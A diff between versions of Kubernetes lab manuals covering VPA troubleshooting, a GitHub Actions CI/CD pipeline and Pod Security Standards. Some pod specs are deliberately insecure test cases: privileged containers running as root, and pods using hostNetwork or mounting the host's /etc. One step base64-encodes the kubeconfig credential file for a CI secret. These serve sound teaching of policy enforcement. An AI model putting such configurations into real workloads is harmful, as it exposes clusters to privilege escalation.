+Problem: VPA recommendations are generated but pods are not updated.
 
-# Verify profile syntax
-sudo apparmor_parser -Q /etc/apparmor.d/containers.restricted-container
+Solution:
 
-Issue 3: Pod Annotation Issues
+    Ensure VPA is in "Auto" mode:
 
-Symptoms: AppArmor annotations not recognized
+kubectl describe vpa php-apache-vpa
 
-Solutions:
+    Check VPA admission controller:
 
-# Check annotation format
-kubectl get pod hardened-test-pod -o yaml | grep -A5 annotations
+kubectl get pods -n kube-system | grep vpa-admission-controller
 
-# Verify node AppArmor support
-kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.osImage}'
+    Verify no resource quotas are blocking updates:
+
+kubectl describe resourcequota
+
+Issue 3: Scaling Too Aggressive or Too Slow
+
+Problem: Autoscaling behavior is not optimal.
+
+Solution:
+
+    Adjust scaling policies in HPA behavior section
+    Modify stabilization windows
+    Fine-tune target utilization percentages
 
 Cleanup
 
-    Remove test Pods:
+Clean up the resources created in this lab:
 
-kubectl delete pod seccomp-test-pod apparmor-test-pod hardened-test-pod --ignore-not-found=true
+# Delete deployments
+kubectl delete deployment php-apache load-generator
 
-    Remove AppArmor profile (optional):
+# Delete services
+kubectl delete service php-apache
 
-sudo aa-disable /etc/apparmor.d/containers.restricted-container
+# Delete HPA
+kubectl delete hpa --all
 
-    Clean up files:
+# Delete VPA
+kubectl delete vpa --all
 
-rm -f seccomp-pod.yaml apparmor-pod.yaml hardened-pod.yaml
-rm -f monitor-security.sh performance-test.sh
+# Delete configuration files
+rm -f php-apache-deployment.yaml hpa-config.yaml vpa-config.yaml load-generator-deployment.yaml
+rm -f multi-metric-hpa.yaml custom-metric-hpa.yaml vpa-recommend-only.yaml
+
+# Clean up VPA installation (optional)
+cd autoscaler/vertical-pod-autoscaler/
+./hack/vpa-down.sh
+cd ../../../
+rm -rf autoscaler/
 
 Conclusion
 
-In this lab, you have successfully:
+In this comprehensive lab, you have successfully:
 
-• Implemented seccomp profiles to restrict system calls and prevent unauthorized kernel access • Created and applied AppArmor profiles to control file system and process access at the application level • Combined multiple security mechanisms to create a comprehensive defense-in-depth strategy • Tested security profile enforcement through practical verification methods • Monitored security violations and assessed performance impact
+• Implemented Horizontal Pod Autoscaler (HPA) to automatically scale applications based on CPU utilization, learning how Kubernetes can dynamically adjust the number of pod replicas to handle varying workloads
 
-Why This Matters: System hardening with seccomp and AppArmor is crucial for container security because it provides multiple layers of protection against privilege escalation, unauthorized system access, and potential container breakout attacks. These technologies are essential components of a robust Kubernetes security posture and are frequently tested in the Certified Kubernetes Security Specialist (CKS) certification.
+• Generated synthetic traffic and observed real-time scaling behavior, understanding how HPA responds to load changes and the importance of proper resource requests and limits
 
-Key Takeaways:
+• Configured Vertical Pod Autoscaler (VPA) to automatically adjust resource requests and limits, learning the difference between horizontal scaling (more pods) and vertical scaling (bigger pods)
 
-    seccomp operates at the kernel level to filter system calls
-    AppArmor provides mandatory access control at the application level
-    Combining multiple security profiles creates stronger protection
-    Proper testing and monitoring are essential for effective security implementation
-    Security hardening may have minimal performance impact when properly configured
+• Explored advanced autoscaling scenarios including multi-metric scaling and custom metrics, preparing you for complex production environments
 
-This hands-on experience prepares you for real-world container security scenarios and advanced Kubernetes security certifications.
+• Gained hands-on experience with monitoring tools and troubleshooting techniques essential for managing autoscaling in production Kubernetes clusters
 
+This knowledge is crucial for the Kubernetes and Cloud Native Associate (KCNA) certification and real-world Kubernetes operations. Autoscaling is a fundamental capability that enables applications to handle varying loads efficiently while optimizing resource utilization and costs. Understanding both HPA and VPA allows you to choose the right scaling strategy for different application patterns and requirements.
 
+The skills you've developed in this lab will help you design resilient, cost-effective Kubernetes applications that can automatically adapt to changing demands, making you a more effective cloud-native engineer.
 
 
-Lab 4: Pod Security Standards
+
+
+Lab 16: Integrating Kubernetes with CI/CD Pipelines
 Objectives
 
-By the end of this lab, students will be able to:
+By the end of this lab, you will be able to:
 
-• Understand the three Pod Security Standard levels: Privileged, Baseline, and Restricted • Configure namespace-level Pod Security Standards enforcement • Deploy pods with different security contexts and observe policy enforcement • Analyze the differences between Baseline and Restricted security policies • Troubleshoot pod deployment failures due to security policy violations • Implement security best practices for Kubernetes workloads
+• Set up a complete CI/CD pipeline using GitHub Actions • Automatically build and push Docker images to a container registry • Deploy applications to a Kubernetes cluster through automation • Implement automated testing and deployment verification • Configure rollback procedures for failed deployments • Understand the integration between CI/CD tools and Kubernetes • Apply best practices for container-based deployment workflows
 Prerequisites
 
-Before starting this lab, students should have:
+Before starting this lab, you should have:
 
-• Basic understanding of Kubernetes concepts (pods, namespaces, deployments) • Familiarity with YAML configuration files • Knowledge of Linux command line operations • Understanding of container security concepts • Completed previous Kubernetes security labs or equivalent experience
-Lab Environment
+• Basic understanding of Docker containers and images • Familiarity with Kubernetes concepts (pods, deployments, services) • Knowledge of Git version control system • Understanding of YAML configuration files • Basic command-line interface experience • GitHub account (free tier is sufficient)
+Lab Environment Setup
 
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click Start Lab to access your environment - no need to build your own VM or install software.
+Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to access your environment. No need to build your own VM or install additional software.
 
-Your lab environment includes: • Ubuntu 22.04 LTS with kubectl pre-installed • Single-node Kubernetes cluster (v1.28+) • All necessary tools and permissions configured
-Task 1: Understanding Pod Security Standards
-Subtask 1.1: Explore Current Cluster Configuration
+Your lab environment includes: • Ubuntu 20.04 LTS with Docker pre-installed • kubectl command-line tool configured • Minikube for local Kubernetes cluster • Git client and text editors • All necessary networking configurations
+Task 1: Setting Up the Development Environment
+Subtask 1.1: Initialize the Project Repository
 
-First, let's examine the current state of your Kubernetes cluster and understand the default security settings.
+First, we'll create a sample application and set up version control.
 
-    Check cluster information:
+    Create a new directory for your project:
+
+mkdir k8s-cicd-lab
+cd k8s-cicd-lab
+
+    Initialize a Git repository:
+
+git init
+git config user.name "Your Name"
+git config user.email "your.email@example.com"
+
+    Create a simple Node.js application:
+
+cat > app.js << 'EOF'
+const express = require('express');
+const app = express();
+const port = 3000;
+
+app.get('/', (req, res) => {
+  res.json({
+    message: 'Hello from Kubernetes CI/CD Pipeline!',
+    version: process.env.APP_VERSION || '1.0.0',
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/health', (req, res) => {
+  res.status(200).json({ status: 'healthy' });
+});
+
+app.listen(port, '0.0.0.0', () => {
+  console.log(`App running on port ${port}`);
+});
+EOF
+
+    Create package.json file:
+
+cat > package.json << 'EOF'
+{
+  "name": "k8s-cicd-app",
+  "version": "1.0.0",
+  "description": "Sample app for Kubernetes CI/CD integration",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Running tests...\" && exit 0"
+  },
+  "dependencies": {
+    "express": "^4.18.2"
+  }
+}
+EOF
+
+Subtask 1.2: Create Dockerfile
+
+Create a Dockerfile to containerize the application:
+
+cat > Dockerfile << 'EOF'
+FROM node:18-alpine
+
+WORKDIR /app
+
+COPY package*.json ./
+RUN npm install --only=production
+
+COPY . .
+
+EXPOSE 3000
+
+USER node
+
+CMD ["npm", "start"]
+EOF
+
+Subtask 1.3: Create Kubernetes Manifests
+
+    Create a deployment manifest:
+
+mkdir k8s-manifests
+cat > k8s-manifests/deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: cicd-app
+  labels:
+    app: cicd-app
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: cicd-app
+  template:
+    metadata:
+      labels:
+        app: cicd-app
+    spec:
+      containers:
+      - name: cicd-app
+        image: cicd-app:latest
+        ports:
+        - containerPort: 3000
+        env:
+        - name: APP_VERSION
+          value: "1.0.0"
+        livenessProbe:
+          httpGet:
+            path: /health
+            port: 3000
+          initialDelaySeconds: 30
+          periodSeconds: 10
+        readinessProbe:
+          httpGet:
+            path: /health
+            port: 3000
+          initialDelaySeconds: 5
+          periodSeconds: 5
+EOF
+
+    Create a service manifest:
+
+cat > k8s-manifests/service.yaml << 'EOF'
+apiVersion: v1
+kind: Service
+metadata:
+  name: cicd-app-service
+spec:
+  selector:
+    app: cicd-app
+  ports:
+    - protocol: TCP
+      port: 80
+      targetPort: 3000
+  type: LoadBalancer
+EOF
+
+Task 2: Setting Up CI/CD Pipeline with GitHub Actions
+Subtask 2.1: Create GitHub Actions Workflow
+
+    Create the GitHub Actions directory structure:
+
+mkdir -p .github/workflows
+
+    Create the main CI/CD workflow file:
+
+cat > .github/workflows/ci-cd.yaml << 'EOF'
+name: CI/CD Pipeline
+
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    branches: [ main ]
+
+env:
+  REGISTRY: docker.io
+  IMAGE_NAME: cicd-app
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+        cache: 'npm'
+
+    - name: Install dependencies
+      run: npm ci
+
+    - name: Run tests
+      run: npm test
+
+    - name: Run security audit
+      run: npm audit --audit-level high
+
+  build-and-push:
+    needs: test
+    runs-on: ubuntu-latest
+    if: github.ref == 'refs/heads/main'
+    outputs:
+      image-tag: ${{ steps.meta.outputs.tags }}
+      image-digest: ${{ steps.build.outputs.digest }}
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Docker Buildx
+      uses: docker/setup-buildx-action@v3
+
+    - name: Log in to Docker Hub
+      uses: docker/login-action@v3
+      with:
+        username: ${{ secrets.DOCKER_USERNAME }}
+        password: ${{ secrets.DOCKER_PASSWORD }}
+
+    - name: Extract metadata
+      id: meta
+      uses: docker/metadata-action@v5
+      with:
+        images: ${{ env.REGISTRY }}/${{ secrets.DOCKER_USERNAME }}/${{ env.IMAGE_NAME }}
+        tags: |
+          type=ref,event=branch
+          type=ref,event=pr
+          type=sha,prefix={{branch}}-
+          type=raw,value=latest,enable={{is_default_branch}}
+
+    - name: Build and push Docker image
+      id: build
+      uses: docker/build-push-action@v5
+      with:
+        context: .
+        platforms: linux/amd64,linux/arm64
+        push: true
+        tags: ${{ steps.meta.outputs.tags }}
+        labels: ${{ steps.meta.outputs.labels }}
+        cache-from: type=gha
+        cache-to: type=gha,mode=max
+
+  deploy:
+    needs: build-and-push
+    runs-on: ubuntu-latest
+    if: github.ref == 'refs/heads/main'
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Setup kubectl
+      uses: azure/setup-kubectl@v3
+      with:
+        version: 'v1.28.0'
+
+    - name: Configure kubectl
+      run: |
+        mkdir -p $HOME/.kube
+        echo "${{ secrets.KUBECONFIG }}" | base64 -d > $HOME/.kube/config
+
+    - name: Update deployment image
+      run: |
+        sed -i 's|image: cicd-app:latest|image: ${{ needs.build-and-push.outputs.image-tag }}|g' k8s-manifests/deployment.yaml
+
+    - name: Deploy to Kubernetes
+      run: |
+        kubectl apply -f k8s-manifests/
+        kubectl rollout status deployment/cicd-app --timeout=300s
+
+    - name: Verify deployment
+      run: |
+        kubectl get pods -l app=cicd-app
+        kubectl get services cicd-app-service
+EOF
+
+Subtask 2.2: Create Rollback Workflow
+
+Create a separate workflow for handling rollbacks:
+
+cat > .github/workflows/rollback.yaml << 'EOF'
+name: Rollback Deployment
+
+on:
+  workflow_dispatch:
+    inputs:
+      revision:
+        description: 'Revision number to rollback to (leave empty for previous)'
+        required: false
+        type: string
+
+jobs:
+  rollback:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup kubectl
+      uses: azure/setup-kubectl@v3
+      with:
+        version: 'v1.28.0'
+
+    - name: Configure kubectl
+      run: |
+        mkdir -p $HOME/.kube
+        echo "${{ secrets.KUBECONFIG }}" | base64 -d > $HOME/.kube/config
+
+    - name: Rollback deployment
+      run: |
+        if [ -n "${{ github.event.inputs.revision }}" ]; then
+          kubectl rollout undo deployment/cicd-app --to-revision=${{ github.event.inputs.revision }}
+        else
+          kubectl rollout undo deployment/cicd-app
+        fi
+
+    - name: Wait for rollback completion
+      run: |
+        kubectl rollout status deployment/cicd-app --timeout=300s
+
+    - name: Verify rollback
+      run: |
+        kubectl get pods -l app=cicd-app
+        kubectl describe deployment cicd-app
+EOF
+
+Task 3: Setting Up Local Kubernetes Environment
+Subtask 3.1: Start Minikube Cluster
+
+    Start Minikube with appropriate resources:
+
+minikube start --driver=docker --memory=4096 --cpus=2
+
+    Verify cluster is running:
 
 kubectl cluster-info
+kubectl get nodes
 
-    List existing namespaces:
+    Enable necessary addons:
 
-kubectl get namespaces
+minikube addons enable ingress
+minikube addons enable metrics-server
 
-    Check if Pod Security Standards are enabled:
+Subtask 3.2: Configure Docker Environment
 
-kubectl api-versions | grep policy
+Configure Docker to use Minikube's Docker daemon:
 
-Subtask 1.2: Create Test Namespaces
+eval $(minikube docker-env)
 
-Create dedicated namespaces for testing different security policies.
+This allows you to build images directly in Minikube's Docker environment.
+Task 4: Manual Testing and Deployment
+Subtask 4.1: Build and Test Locally
 
-    Create namespace for Baseline testing:
+Before setting up the full CI/CD pipeline, let's test everything manually:
 
-kubectl create namespace baseline-test
+    Build the Docker image:
 
-    Create namespace for Restricted testing:
+docker build -t cicd-app:v1.0.0 .
 
-kubectl create namespace restricted-test
+    Test the container locally:
 
-    Verify namespace creation:
+docker run -d -p 3000:3000 --name test-app cicd-app:v1.0.0
 
-kubectl get namespaces | grep test
+    Verify the application is working:
 
-Task 2: Configure Baseline Pod Security Standard
-Subtask 2.1: Apply Baseline Policy to Namespace
+curl http://localhost:3000
+curl http://localhost:3000/health
 
-Configure the baseline-test namespace to enforce the Baseline Pod Security Standard.
+    Stop and remove the test container:
 
-    Create a namespace configuration file:
+docker stop test-app
+docker rm test-app
 
-cat > baseline-namespace.yaml << 'EOF'
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: baseline-test
-  labels:
-    pod-security.kubernetes.io/enforce: baseline
-    pod-security.kubernetes.io/audit: baseline
-    pod-security.kubernetes.io/warn: baseline
+Subtask 4.2: Deploy to Kubernetes Manually
+
+    Update the deployment manifest to use the local image:
+
+sed -i 's|image: cicd-app:latest|image: cicd-app:v1.0.0|g' k8s-manifests/deployment.yaml
+sed -i 's|imagePullPolicy: Always|imagePullPolicy: Never|g' k8s-manifests/deployment.yaml
+
+    Deploy the application:
+
+kubectl apply -f k8s-manifests/
+
+    Check deployment status:
+
+kubectl get deployments
+kubectl get pods
+kubectl get services
+
+    Wait for deployment to be ready:
+
+kubectl rollout status deployment/cicd-app
+
+Subtask 4.3: Test the Deployed Application
+
+    Get the service URL:
+
+minikube service cicd-app-service --url
+
+    Test the application (replace URL with the output from previous command):
+
+SERVICE_URL=$(minikube service cicd-app-service --url)
+curl $SERVICE_URL
+curl $SERVICE_URL/health
+
+Task 5: Setting Up GitHub Repository and Secrets
+Subtask 5.1: Create GitHub Repository
+
+    Add all files to Git:
+
+git add .
+git commit -m "Initial commit: Add application and CI/CD configuration"
+
+    Create a new repository on GitHub (through the web interface):
+        Go to https://github.com
+        Click "New repository"
+        Name it "k8s-cicd-lab"
+        Make it public or private as preferred
+        Don't initialize with README (we already have files)
+
+    Push to GitHub:
+
+git remote add origin https://github.com/YOUR_USERNAME/k8s-cicd-lab.git
+git branch -M main
+git push -u origin main
+
+Subtask 5.2: Configure GitHub Secrets
+
+You need to set up the following secrets in your GitHub repository:
+
+    Go to your repository on GitHub
+    Click Settings → Secrets and variables → Actions
+    Add the following secrets:
+
+DOCKER_USERNAME: Your Docker Hub username DOCKER_PASSWORD: Your Docker Hub password or access token KUBECONFIG: Base64 encoded kubeconfig file
+
+To get the base64 encoded kubeconfig:
+
+cat ~/.kube/config | base64 -w 0
+
+Task 6: Testing the Complete CI/CD Pipeline
+Subtask 6.1: Trigger the Pipeline
+
+    Make a change to the application:
+
+sed -i 's/version: process.env.APP_VERSION || '\''1.0.0'\''/version: process.env.APP_VERSION || '\''1.1.0'\''/g' app.js
+
+    Commit and push the change:
+
+git add app.js
+git commit -m "Update application version to 1.1.0"
+git push origin main
+
+    Monitor the GitHub Actions workflow:
+        Go to your repository on GitHub
+        Click the "Actions" tab
+        Watch the workflow execution
+
+Subtask 6.2: Verify Automated Deployment
+
+    Check if the deployment was updated:
+
+kubectl get deployments
+kubectl describe deployment cicd-app
+
+    Verify the new version is running:
+
+kubectl get pods
+SERVICE_URL=$(minikube service cicd-app-service --url)
+curl $SERVICE_URL
+
+Task 7: Testing Rollback Procedures
+Subtask 7.1: Simulate a Failed Deployment
+
+    Create a broken version of the application:
+
+cat > app.js << 'EOF'
+const express = require('express');
+const app = express();
+const port = 3000;
+
+// Intentionally broken code
+app.get('/', (req, res) => {
+  // This will cause an error
+  nonExistentFunction();
+  res.json({
+    message: 'This version is broken!',
+    version: '2.0.0'
+  });
+});
+
+app.listen(port, '0.0.0.0', () => {
+  console.log(`App running on port ${port}`);
+});
 EOF
 
-    Apply the configuration:
+    Commit and push the broken version:
 
-kubectl apply -f baseline-namespace.yaml
+git add app.js
+git commit -m "Deploy broken version 2.0.0 (for rollback testing)"
+git push origin main
 
-    Verify the policy is applied:
+Subtask 7.2: Monitor the Failed Deployment
 
-kubectl describe namespace baseline-test
+    Watch the deployment status:
 
-Subtask 2.2: Test Compliant Pod Deployment
-
-Deploy a pod that complies with the Baseline security standard.
-
-    Create a compliant pod configuration:
-
-cat > compliant-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: compliant-app
-  namespace: baseline-test
-spec:
-  containers:
-  - name: app
-    image: nginx:1.21
-    ports:
-    - containerPort: 80
-    securityContext:
-      allowPrivilegeEscalation: false
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-EOF
-
-    Deploy the compliant pod:
-
-kubectl apply -f compliant-pod.yaml
+kubectl rollout status deployment/cicd-app --timeout=60s
 
     Check pod status:
 
-kubectl get pods -n baseline-test
+kubectl get pods
+kubectl describe pods -l app=cicd-app
 
-    View pod details:
+Subtask 7.3: Perform Manual Rollback
 
-kubectl describe pod compliant-app -n baseline-test
+    Check rollout history:
 
-Subtask 2.3: Test Non-Compliant Pod Deployment
+kubectl rollout history deployment/cicd-app
 
-Attempt to deploy a pod that violates the Baseline security standard.
+    Rollback to previous version:
 
-    Create a privileged pod configuration:
+kubectl rollout undo deployment/cicd-app
 
-cat > privileged-pod.yaml << 'EOF'
+    Verify rollback success:
+
+kubectl rollout status deployment/cicd-app
+SERVICE_URL=$(minikube service cicd-app-service --url)
+curl $SERVICE_URL
+
+Subtask 7.4: Test Automated Rollback via GitHub Actions
+
+    Go to your GitHub repository
+    Click Actions → Rollback Deployment → Run workflow
+    Leave revision empty to rollback to previous version
+    Click "Run workflow"
+
+Task 8: Advanced Pipeline Features
+Subtask 8.1: Add Environment-Specific Deployments
+
+Create separate deployment configurations for different environments:
+
+mkdir -p k8s-manifests/environments/{staging,production}
+
+# Staging environment
+cat > k8s-manifests/environments/staging/kustomization.yaml << 'EOF'
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+
+resources:
+- ../../deployment.yaml
+- ../../service.yaml
+
+namePrefix: staging-
+namespace: staging
+
+replicas:
+- name: cicd-app
+  count: 1
+
+patches:
+- patch: |-
+    - op: replace
+      path: /spec/template/spec/containers/0/env/0/value
+      value: "staging-1.0.0"
+  target:
+    kind: Deployment
+    name: cicd-app
+EOF
+
+# Production environment
+cat > k8s-manifests/environments/production/kustomization.yaml << 'EOF'
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+
+resources:
+- ../../deployment.yaml
+- ../../service.yaml
+
+namePrefix: prod-
+namespace: production
+
+replicas:
+- name: cicd-app
+  count: 5
+
+patches:
+- patch: |-
+    - op: replace
+      path: /spec/template/spec/containers/0/env/0/value
+      value: "production-1.0.0"
+  target:
+    kind: Deployment
+    name: cicd-app
+EOF
+
+Subtask 8.2: Create Namespaces
+
+kubectl create namespace staging
+kubectl create namespace production
+
+Subtask 8.3: Deploy to Multiple Environments
+
+# Deploy to staging
+kubectl apply -k k8s-manifests/environments/staging/
+
+# Deploy to production
+kubectl apply -k k8s-manifests/environments/production/
+
+# Verify deployments
+kubectl get deployments --all-namespaces
+
+Troubleshooting Common Issues
+Issue 1: Docker Build Failures
+
+Problem: Docker build fails with permission errors Solution:
+
+sudo usermod -aG docker $USER
+newgrp docker
+
+Issue 2: Kubernetes Deployment Stuck
+
+Problem: Pods remain in Pending state Solution:
+
+kubectl describe pods -l app=cicd-app
+kubectl get events --sort-by=.metadata.creationTimestamp
+
+Issue 3: Service Not Accessible
+
+Problem: Cannot access the application through the service Solution:
+
+kubectl port-forward service/cicd-app-service 8080:80
+curl http://localhost:8080
+
+Issue 4: GitHub Actions Workflow Fails
+
+Problem: CI/CD pipeline fails due to missing secrets Solution:
+
+    Verify all required secrets are set in GitHub repository settings
+    Check secret names match exactly with workflow file
+    Ensure Docker Hub credentials are correct
+
+Issue 5: Image Pull Errors
+
+Problem: Kubernetes cannot pull the Docker image Solution:
+
+# For local development with Minikube
+eval $(minikube docker-env)
+docker build -t cicd-app:latest .
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 16: Integrating Kubernetes with CI/CD Pipelines. In this comprehensive lab, you have accomplished the following:
+
+Key Achievements: • Built a complete CI/CD pipeline using GitHub Actions that automatically builds, tests, and deploys applications • Integrated Docker containerization with Kubernetes deployment workflows • Implemented automated testing and security auditing in your pipeline • Configured multi-environment deployments with staging and production configurations • Mastered rollback procedures both manual and automated for handling deployment failures • Applied DevOps best practices including proper secret management and environment separation
+
+Technical Skills Developed: • Container orchestration with Kubernetes • Continuous Integration and Continuous Deployment (CI/CD) concepts • Infrastructure as Code using YAML manifests • Automated testing and deployment verification • Rollback strategies and disaster recovery procedures • Multi-environment deployment management
+
+Real-World Applications: This lab simulates real-world enterprise scenarios where development teams need to:
+
+    Automatically deploy code changes to production environments
+    Maintain high availability during deployments
+    Quickly recover from failed deployments
+    Manage multiple environments with different configurations
+    Ensure code quality through automated testing
+
+Why This Matters: Modern software development relies heavily on automation to deliver reliable, scalable applications. The CI/CD pipeline you've built represents industry-standard practices used by companies worldwide to:
+
+    Reduce manual errors in deployment processes
+    Increase deployment frequency and reliability
+    Enable rapid response to issues through automated rollbacks
+    Maintain consistent environments across development lifecycle
+    Support agile development methodologies
+
+Next Steps: To further enhance your skills, consider exploring:
+
+    Advanced Kubernetes features like Helm charts and operators
+    Monitoring and observability tools like Prometheus and Grafana
+    Security scanning integration in CI/CD pipelines
+    GitOps workflows with tools like ArgoCD or Flux
+    Service mesh technologies like Istio for advanced traffic management
+
+You now have the foundational knowledge to implement robust CI/CD pipelines in production environments and are well-prepared for the Kubernetes and Cloud Native Associate (KCNA) certification exam.
+
+
+
+
+Lab 17: Exploring Kubernetes Security Best Practices
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Understand and implement Pod Security Standards in Kubernetes clusters • Configure and apply Network Policies to control Pod-to-Pod communication • Set up image vulnerability scanning using Trivy • Implement security best practices for container workloads • Troubleshoot common security configuration issues in Kubernetes
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with YAML configuration files • Basic knowledge of Linux command line operations • Understanding of container security concepts • Completion of previous Kubernetes labs or equivalent experience
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.
+
+Your lab environment includes: • Ubuntu 22.04 LTS with kubectl pre-configured • Kubernetes cluster (kind or minikube) ready to use • All necessary tools pre-installed • Internet access for downloading container images
+Task 1: Implementing Pod Security Standards
+
+Pod Security Standards replace the deprecated PodSecurityPolicies and provide a simpler way to enforce security policies.
+Subtask 1.1: Understanding Pod Security Standards
+
+Pod Security Standards define three security profiles: • Privileged: Unrestricted policy (no restrictions) • Baseline: Minimally restrictive policy (prevents known privilege escalations) • Restricted: Heavily restricted policy (follows Pod hardening best practices)
+Subtask 1.2: Enable Pod Security Admission
+
+First, let's check if Pod Security Admission is enabled in your cluster:
+
+kubectl api-versions | grep admissionregistration
+
+Create a namespace with Pod Security Standards enforcement:
+
+# Create a restricted namespace
+kubectl create namespace secure-apps
+
+# Apply Pod Security Standards labels
+kubectl label namespace secure-apps \
+  pod-security.kubernetes.io/enforce=restricted \
+  pod-security.kubernetes.io/audit=restricted \
+  pod-security.kubernetes.io/warn=restricted
+
+Subtask 1.3: Test Pod Security Standards
+
+Create a test deployment that violates security policies:
+
+# Create file: insecure-pod.yaml
+cat << 'EOF' > insecure-pod.yaml
 apiVersion: v1
 kind: Pod
 metadata:
-  name: privileged-app
-  namespace: baseline-test
+  name: insecure-pod
+  namespace: secure-apps
 spec:
   containers:
-  - name: app
-    image: nginx:1.21
-    ports:
-    - containerPort: 80
+  - name: nginx
+    image: nginx:latest
     securityContext:
       privileged: true
       runAsUser: 0
-EOF
-
-    Attempt to deploy the privileged pod:
-
-kubectl apply -f privileged-pod.yaml
-
-    Observe the enforcement action:
-
-kubectl get events -n baseline-test --sort-by='.lastTimestamp'
-
-    Check if the pod was created:
-
-kubectl get pods -n baseline-test
-
-Task 3: Test Various Security Contexts
-Subtask 3.1: Test Host Network Access
-
-Test a pod that attempts to use host networking.
-
-    Create host network pod configuration:
-
-cat > host-network-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: host-network-app
-  namespace: baseline-test
-spec:
-  hostNetwork: true
-  containers:
-  - name: app
-    image: nginx:1.21
     ports:
     - containerPort: 80
 EOF
 
-    Attempt deployment:
+Try to apply this insecure pod:
 
-kubectl apply -f host-network-pod.yaml
+kubectl apply -f insecure-pod.yaml
 
-    Check the result:
+You should see warnings or errors about security policy violations.
+Subtask 1.4: Create a Compliant Pod
 
-kubectl get pods -n baseline-test
-kubectl describe pod host-network-app -n baseline-test 2>/dev/null || echo "Pod creation blocked"
+Now create a security-compliant pod:
 
-Subtask 3.2: Test Volume Mounts
-
-Test a pod with various volume mount configurations.
-
-    Create pod with hostPath volume:
-
-cat > hostpath-pod.yaml << 'EOF'
+# Create file: secure-pod.yaml
+cat << 'EOF' > secure-pod.yaml
 apiVersion: v1
 kind: Pod
 metadata:
-  name: hostpath-app
-  namespace: baseline-test
-spec:
-  containers:
-  - name: app
-    image: nginx:1.21
-    volumeMounts:
-    - name: host-volume
-      mountPath: /host-data
-  volumes:
-  - name: host-volume
-    hostPath:
-      path: /etc
-      type: Directory
-EOF
-
-    Attempt deployment:
-
-kubectl apply -f hostpath-pod.yaml
-
-    Analyze the results:
-
-kubectl get pods -n baseline-test
-kubectl describe pod hostpath-app -n baseline-test 2>/dev/null || echo "Pod creation may be blocked"
-
-Task 4: Upgrade to Restricted Pod Security Standard
-Subtask 4.1: Configure Restricted Policy
-
-Upgrade the namespace policy to use the Restricted Pod Security Standard.
-
-    Update the restricted-test namespace:
-
-cat > restricted-namespace.yaml << 'EOF'
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: restricted-test
-  labels:
-    pod-security.kubernetes.io/enforce: restricted
-    pod-security.kubernetes.io/audit: restricted
-    pod-security.kubernetes.io/warn: restricted
-EOF
-
-    Apply the restricted configuration:
-
-kubectl apply -f restricted-namespace.yaml
-
-    Verify the policy:
-
-kubectl describe namespace restricted-test
-
-Subtask 4.2: Test Previously Compliant Pod
-
-Test if the pod that worked with Baseline policy works with Restricted policy.
-
-    Deploy the previously compliant pod to restricted namespace:
-
-cat > compliant-pod-restricted.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: compliant-app
-  namespace: restricted-test
-spec:
-  containers:
-  - name: app
-    image: nginx:1.21
-    ports:
-    - containerPort: 80
-    securityContext:
-      allowPrivilegeEscalation: false
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-EOF
-
-    Attempt deployment:
-
-kubectl apply -f compliant-pod-restricted.yaml
-
-    Check the result:
-
-kubectl get pods -n restricted-test
-kubectl describe pod compliant-app -n restricted-test 2>/dev/null || echo "Pod may need additional security context"
-
-Subtask 4.3: Create Fully Restricted-Compliant Pod
-
-Create a pod that meets all Restricted policy requirements.
-
-    Create a fully compliant pod:
-
-cat > fully-compliant-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: fully-compliant-app
-  namespace: restricted-test
+  name: secure-pod
+  namespace: secure-apps
 spec:
   securityContext:
     runAsNonRoot: true
@@ -1733,19 +8879,18 @@ spec:
     seccompProfile:
       type: RuntimeDefault
   containers:
-  - name: app
-    image: nginx:1.21
-    ports:
-    - containerPort: 8080
+  - name: nginx
+    image: nginx:latest
     securityContext:
       allowPrivilegeEscalation: false
       readOnlyRootFilesystem: true
       runAsNonRoot: true
       runAsUser: 1000
-      runAsGroup: 1000
       capabilities:
         drop:
         - ALL
+    ports:
+    - containerPort: 8080
     volumeMounts:
     - name: tmp-volume
       mountPath: /tmp
@@ -1762,11398 +8907,42 @@ spec:
     emptyDir: {}
 EOF
 
-    Deploy the fully compliant pod:
+Apply the secure pod:
 
-kubectl apply -f fully-compliant-pod.yaml
-
-    Verify successful deployment:
-
-kubectl get pods -n restricted-test
-kubectl describe pod fully-compliant-app -n restricted-test
-
-Task 5: Compare Policy Enforcement
-Subtask 5.1: Create Comparison Deployment
-
-Deploy the same application configuration to both namespaces to observe differences.
-
-    Create a test deployment:
-
-cat > test-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: test-app
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: test-app
